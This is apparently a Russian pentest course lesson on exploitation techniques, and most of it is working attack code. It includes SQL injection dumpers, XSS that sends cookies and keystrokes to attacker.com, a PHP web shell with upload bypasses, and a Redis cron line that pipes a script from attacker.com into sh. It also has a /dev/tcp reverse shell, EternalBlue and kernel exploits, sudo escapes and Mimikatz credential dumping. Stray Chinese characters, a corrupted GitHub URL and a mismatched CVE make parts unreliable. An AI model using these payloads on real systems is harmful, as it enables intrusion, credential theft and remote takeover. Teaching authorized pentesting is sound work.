# Техники эксплуатации

## Введение в эксплуатацию

Эксплуатация (Exploitation) — это этап пентестинга, на котором найденные уязвимости превращаются в реальный доступ к системе. Это наиболее технически сложный этап, требующий глубокого понимания работы операционных систем, сетей и приложений.

## Механизмы эксплуатации

### Типы эксплойтов

**По цели:**
- **Локальные (Local)** — требуют предварительного доступа к системе
- **Удалённые (Remote)** — эксплуатируются по сети
- **Веб-эксплойты** — для веб-приложений
- **Сетевые сервисы** — для служб (SSH, FTP, SMB)

**По типу уязвимости:**
- Переполнение буфера (Buffer Overflow)
- Форматирование строки (Format String)
- Use-After-Free
- Double-Free
- Race Condition
- Directory Traversal

### Структура эксплойта

```c
// Типичная структура эксплойта для переполнения буфера

#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];              // Буфер ограниченного размера
    strcpy(buffer, input);        // Копирование без проверки длины
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

### Работа с эксплойтами

**Поиск эксплойтов:**

```bash
# searchsploit (Exploit-DB)
searchsploit apache 2.4.41
searchsploit -s "Cross Site Scripting"
searchsploit -p 50615  # По ID

# msfconsole (Metasploit)
msf> search type:exploit platform:linux
msf> search cve:2021
msf> use exploit/linux/http/apache_cve_2021_41773

# Google
site:exploit-db.com CVE-2021-41773
site:github.com apache open redirect exploit
```

**Использование эксплойтов:**

```bash
# Metasploit
msfconsole
msf> use exploit/multi/http/apache_cve_2021_41773
msf> show options
msf> set RHOSTS example.com
msf> set RPORT 8080
msf> run

# Exploit-DB эксплойты
searchsploit -p 50615  # Показать путь
searchsploit -m 50615  # Скопировать в текущую директорию
gcc exploit.c -o exploit
./exploit target_ip
```

## Эксплуатация веб-уязвимостей

### SQL Injection

**Union-based SQLi:**

```sql
-- Определение количества столбцов
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  -- Ошибка, значит 3 столбца

-- Получение данных
' UNION SELECT 1,2,3--
' UNION SELECT username,password,email FROM users--
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
```

**Boolean-based Blind SQLi:**

```python
# Python exploit для blind SQLi
import requests

def check_column(table):
    payload = f"' AND (SELECT SUBSTRING({table},1,1) FROM information_schema.tables)='a'--"
    url = f"http://example.com/products?id=1{payload}"
    r = requests.get(url)
    return "Product not found" in r.text

# Получение паролей посимвольно
def dump_password():
    password = ""
    for i in range(1, 33):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            payload = f"' AND SUBSTRING(password,{i},1)='{char}'--"
            url = f"http://example.com/products?id=1{payload}"
            if "Product not found" not in requests.get(url).text:
                password += char
                break
    return password
```

**Time-based Blind SQLi:**

```sql
-- MySQL
' AND IF(SUBSTRING(version(),1,1)='5', SLEEP(5), 0)--
' AND BENCHMARK(10000000,SHA1('test'))--
' AND (SELECT SLEEP(5) FROM users WHERE SUBSTR(password,1,1)='a')--
```

**SQLMap:**

```bash
# Базовая эксплуатация
sqlmap -u "http://example.com/products?id=1"

# Получение баз данных
sqlmap -u "http://example.com/products?id=1" --dbs

# Получение таблиц
sqlmap -u "http://example.com/products?id=1" -D users --tables

# Получение данных
sqlmap -u "http://example.com/products?id=1" -D users -T admin --dump

# OS Shell
sqlmap -u "http://example.com/products?id=1" --os-shell

# Загрузить файл
sqlmap -u "http://example.com/products?id=1" --file-read="/etc/passwd"
```

### Cross-Site Scripting (XSS)

**Reflected XSS:**

```html
<!-- Простой тест -->
<script>alert('XSS')</script>

<!-- Кража cookies -->
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?k=' + e.key);
}
</script>
```

**Stored XSS:**

```html
<!-- В комментарии или профиле -->
<script>
fetch('http://attacker.com/api/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        url: window.location.href,
        localStorage: JSON.stringify(localStorage)
    })
});
</script>

<!-- Bypassing filters -->
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
```

**DOM-based XSS:**

```javascript
// Уязвимый код
var name = location.hash.substring(1);
document.write("Hello, " + name);

// Эксплуатация
http://example.com/page#<img src=x onerror=alert('XSS')>
```

### Command Injection

```bash
# Linux
; cat /etc/passwd
| whoami
&& id
|| id

# Windows
& dir
&& whoami

# С URL-кодированием
%3B%20cat%20%2Fetc%2Fpasswd

# Blind command injection
; sleep 5
& timeout 5
```

### File Inclusion

**Local File Inclusion (LFI):**

```
/page=../../etc/passwd
/page=../../proc/self/environ
/page=../../var/log/apache2/access.log
/page=php://filter/convert.base64-encode/resource=index
/page=expect://whoami  # Если включён expect
```

**Remote File Inclusion (RFI):**

```
page=http://attacker.com/shell.txt
page=http://attacker.com/shell.txt%00
```

### File Upload

```php
<?php
// shell.php - простой web shell
system($_GET['cmd']);
?>

# Использование
http://example.com/uploads/shell.php?cmd=whoami
```

**Bypass методы:**

```bash
# Изменение Content-Type
Content-Type: image/jpeg

# Double extension
shell.php.jpg
shell.jpg.php

# GIF89a header
mv shell.php shell.gif
cp shell.gif shell.php.gif

# .htaccess (Apache)
AddType application/x-httpd-php .xyz
# Загружаем shell.xyz как PHP
```

## Эксплуатация сетевых сервисов

### SMB (EternalBlue - MS17-010)

```bash
# Проверка уязвимости
nmap --script=smb-vuln-ms17-010 target.com

# Metasploit
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS target.com
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> run

# AutoBlue (独立的 эксплойт)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
python eternalblueshell.py target.com
```

### SSH

```bash
# Подбор паролей с Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames.txt -P wordlist.txt ssh://target.com

# SSH туннель после получения доступа
ssh -L 8080:localhost:80 user@target.com
ssh -R 8080:localhost:80 user@attacker.com
ssh -D 1080 user@target.com  # SOCKS прокси
```

### Redis

```bash
# Запись SSH ключа
redis-cli -h target.com
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> SET x "\n\nssh-rsa AAAAB3... test@test\n\n"
> SAVE

# Webshell через cron
redis-cli -h target.com
> SET x "\n\n*/1 * * * * wget http://attacker.com/shell.sh -O -|sh\n\n"
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SAVE
```

## Повышение привилегий (Privilege Escalation)

### Linux

**Сбор информации:**

```bash
# Версия ядра
uname -a
cat /etc/os-release

# Привилегии
id
whoami
sudo -l

# SUID файлы
find / -perm -4000 2>/dev/null

# cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# Доступные команды
ls -la /usr/bin/
ls -la /sbin/

# network
ip a
route -n
cat /etc/hosts
```

**Exploit для ядра:**

```bash
# Dirty COW (CVE-2016-5195)
wget https://www.exploit-db.com/download/40616
gcc 40616 -o dirtycow
./dirtycow

# Overlayfs (CVE-2021-3490)
wget https://raw.githubusercontent.com/brandon饶/Overlayfs-Privesc-Exploit/master/overlayfs.c
gcc overlayfs.c -o overlayfs
./overlayfs
```

**sudo уязвимости:**

```bash
# GTFOBins - https://gtfobins.github.io
# Проверка, какие команды можно запустить от root

# Примеры:
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
sudo vim -c '!sh'
sudo less /etc/passwd
# внутри less: !sh
```

### Windows

**Сбор информации:**

```powershell
# Версия ОС
systeminfo
ver

# Пользователи
whoami
whoami /priv
whoami /groups

# Службы
sc query
sc queryex type= service state= all

# Запланированные задачи
schtasks /query /fo LIST /v

# Слабые права на файлах
icacls "C:\Program Files\*"
accesschk.exe -dqv "C:\Program Files\*

# Пароли
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

# UAC bypass
whoami /all
```

**Juicy Potato (SeImpersonatePrivilege):**

```powershell
# Проверка привилегий
whoami /priv

# Если есть SeImpersonatePrivilege:
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t *
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

**PrintSpoofer (SeImpersonatePrivilege для Win10+):**

```powershell
PrintSpoofer.exe -c "C:\Windows\System32\cmd.exe"
```

**Mimikatz:**

```powershell
# Дамп паролей
mimikatz.exe
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # privilege::debug

# Pass-the-Hash
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash
```

## Практический пример комплексной эксплуатации

**Сценарий:** Получение доступа к внутренней сети через веб-приложение

```
Шаг 1: Сканирование
nmap -sS -sV target.com
# Найден: Apache 2.4.41 на порту 80

Шаг 2: Поиск уязвимостей
searchsploit apache 2.4.41
# Найден: CVE-2021-41773 (Path Traversal + RCE)

Шаг 3: Базовая эксплуатация (Path Traversal)
curl http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
# Успешно! Получен /etc/passwd

Шаг 4: Получение RCE
curl -H "Content-Type: application/x-www-form-urlencoded" \
  -d "echo;id" \
  "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
# Успешно! Получен вывод команды

Шаг 5: Обратный шелл
curl -H "Content-Type: application/x-www-form-urlencoded" \
  -d "echo bash -i >& /dev/tcp/attacker.com/4444 0>&1" \
  "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
# На атакующей машине:
nc -lvnp 4444
# Получен шелл от www-data

Шаг 6: Повышение привилегий
uname -a
# Linux kernel 4.15 (уязвим к Dirty COV)
# Загружаем эксплойт, компилируем, запускаем
# Получен root!

Шаг 7: Продвижение по сети
ifconfig
#eth0: 192.168.1.15
#Сканируем внутреннюю сеть
for i in {1..254}; do ping -c 1 192.168.1.$i; done
# Найдены дополнительные хосты...
```

## Безопасность при эксплуатации

1. **Работа в изолированной среде** — используйте виртуальные машины
2. **Логирование** — документируйте все действия
3. **Ограничение воздействия** — не ломайте тестируемые системы
4. **Эскалация проблем** — немедленно сообщайте о критических уязвимостях
5. **Очистка следов** — удаляйте установленные эксплойты после теста

## Выводы

Эксплуатация требует глубоких технических знаний и постоянной практики. Изучайте различные типы уязвимостей, тренируйтесь на легальных площадках (HackTheBox, TryHackMe, DVWA), следите за новыми CVE и эксплойтами. Помните: эксплуатация должна проводиться только с письменного согласия клиента и в рамках оговорённого scope.

---

**Следующий урок:** Пост-эксплуатация — что делать после успешного проникновения в систему.

